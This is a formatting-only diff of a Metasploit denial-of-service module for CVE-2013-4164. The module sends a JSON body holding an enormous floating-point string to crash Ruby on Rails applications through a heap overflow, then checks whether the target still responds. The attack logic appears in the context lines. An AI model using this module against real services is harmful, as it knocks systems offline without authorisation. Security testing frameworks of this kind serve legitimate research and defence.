@@ -8,34 +8,37 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Ruby on Rails JSON Processor Floating Point Heap Overflow DoS',
-      'Description'    => %q{
-        When Ruby attempts to convert a string representation of a large floating point
-        decimal number to its floating point equivalent, a heap-based buffer overflow
-        can be triggered. This module has been tested successfully on a Ruby on Rails application
-        using Ruby version 1.9.3-p448 with WebRick and Thin web servers, where the Rails application
-        crashes with a segfault error. Other versions of Ruby are reported to be affected.
-      },
-      'Author'         =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Ruby on Rails JSON Processor Floating Point Heap Overflow DoS',
+        'Description' => %q{
+          When Ruby attempts to convert a string representation of a large floating point
+          decimal number to its floating point equivalent, a heap-based buffer overflow
+          can be triggered. This module has been tested successfully on a Ruby on Rails application
+          using Ruby version 1.9.3-p448 with WebRick and Thin web servers, where the Rails application
+          crashes with a segfault error. Other versions of Ruby are reported to be affected.
+        },
+        'Author' => [
           'Charlie Somerville', # original discoverer
           'joev', # bash PoC
           'todb', # Metasploit module
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2013-4164' ],
           [ 'OSVDB', '100113' ],
           [ 'URL', 'https://www.ruby-lang.org/en/news/2013/11/22/ruby-1-9-3-p484-is-released/' ]
         ],
-      'DisclosureDate' => '2013-11-22'))
+        'DisclosureDate' => '2013-11-22'
+      )
+    )
     register_options(
       [
         OptString.new('TARGETURI', [false, 'The URL of the vulnerable Rails application', '/']),
         OptString.new('HTTPVERB', [false, 'The HTTP verb to use', 'POST'])
-      ])
+      ]
+    )
   end
 
   def uri
@@ -55,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def multiplier
-    (500_000 * (1.0/digit_pattern.size)).to_i
+    (500_000 * (1.0 / digit_pattern.size)).to_i
   end
 
   def fractional_part
@@ -68,7 +71,7 @@ class MetasploitModule < Msf::Auxiliary
   # easier to produce, and slightly better than the static "1.1111..."
   # for 300,000 decimal places.
   def evil_float_string
-    [integer_part,fractional_part].join('.')
+    [integer_part, fractional_part].join('.')
   end
 
   def run
@@ -82,11 +85,12 @@ class MetasploitModule < Msf::Auxiliary
     begin
       res = send_request_cgi(
         {
-          'method'  => verb,
-          'uri'     => uri,
-          'ctype'   => "application/json",
-          'data'    => sploit
-        })
+          'method' => verb,
+          'uri' => uri,
+          'ctype' => "application/json",
+          'data' => sploit
+        }
+      )
     rescue ::Rex::ConnectionRefused
       print_error "Unable to connect. (Connection refused)"
       target_available = false
@@ -106,7 +110,7 @@ class MetasploitModule < Msf::Auxiliary
         'method' => verb,
         'uri' => uri,
         'ctype' => "application/json",
-        'data' => Rex::Text.rand_text_alpha(1+rand(64)).to_json
+        'data' => Rex::Text.rand_text_alpha(1 + rand(64)).to_json
       })
       if res and res.body and res.body.size > 0
         target_available = true
@@ -122,6 +126,5 @@ class MetasploitModule < Msf::Auxiliary
     return unless target_available
 
     print_error "Target is still responsive, DoS was unsuccessful."
-
   end
 end
